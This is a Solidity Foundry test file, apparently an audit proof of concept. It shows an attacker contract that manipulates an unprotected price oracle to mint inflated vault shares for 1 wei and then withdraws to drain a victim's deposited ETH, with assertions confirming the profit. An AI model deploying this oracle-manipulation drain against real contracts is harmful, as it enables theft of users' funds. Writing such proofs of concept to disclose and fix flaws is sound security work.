// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/PriceOracle.sol";

/// @dev Attacker contract that runs the full oracle-manipulation sequence
///      without any privileged role.
contract AttackOracle {
    PriceOracle public oracle;
    Vault       public vault;

    constructor(PriceOracle _oracle, Vault _vault) {
        oracle = _oracle;
        vault  = _vault;
    }

    /// Run the attack:
    ///  1. Set price to 1 wei  → deposit tiny ETH → receive huge share count.
    ///  2. Restore price to 1e18 → withdraw at fair price → collect inflated ETH.
    function attack() external payable {
        // Step 1: crash the oracle price so 1 wei of deposit mints 1e18 shares.
        oracle.setPrice(1);

        // Step 2: deposit msg.value (1 wei) at the crashed price.
        //         shares minted = (1 * 1e18) / 1 = 1e18.
        vault.deposit{value: msg.value}();

        // Step 3: restore the price to 1 ETH per share.
        oracle.setPrice(1 ether);

        // Step 4: withdraw — ethOut = (1e18 shares * 1e18) / 1e18 = 1 ETH.
        vault.withdraw();
    }

    // Needed to receive ETH from the vault's withdraw call.
    receive() external payable {}

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract PocC2OracleManip is Test {
    PriceOracle oracle;
    Vault       vault;

    address victim   = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        oracle = new PriceOracle();
        vault  = new Vault(address(oracle));

        vm.deal(victim,   100 ether);
        vm.deal(attacker,   1 ether);
    }

    function test_oracleManipDrainsVault() public {
        // ----- Victim deposits 10 ETH at fair price (1 ETH per share) -----
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        uint256 vaultBefore = address(vault).balance;
        emit log_named_uint("vault ETH before attack (wei)", vaultBefore);
        assertEq(vaultBefore, 10 ether);

        // ----- Attacker deploys contract with 1 ether budget -----
        vm.startPrank(attacker);
        AttackOracle atk = new AttackOracle(oracle, vault);
        // Forward 1 wei as the deposit capital; keep the rest.
        atk.attack{value: 1}();
        vm.stopPrank();

        uint256 vaultAfter    = address(vault).balance;
        uint256 attackerGross = atk.balance();
        // Profit = ETH received − ETH deposited (1 wei).
        uint256 profit = attackerGross - 1;

        emit log_named_uint("vault ETH after attack (wei)",             vaultAfter);
        emit log_named_uint("attacker contract ETH after attack (wei)", attackerGross);
        emit log_named_uint("attacker profit (wei)",                    profit);

        // Assertions:
        // — Attacker extracted more than their 1-wei deposit.
        assertGt(attackerGross, 1, "attacker should profit");
        // — Vault balance shrank by more than the 1-wei deposit.
        assertLt(vaultAfter, vaultBefore - 1, "vault should lose more than 1 wei");
    }
}
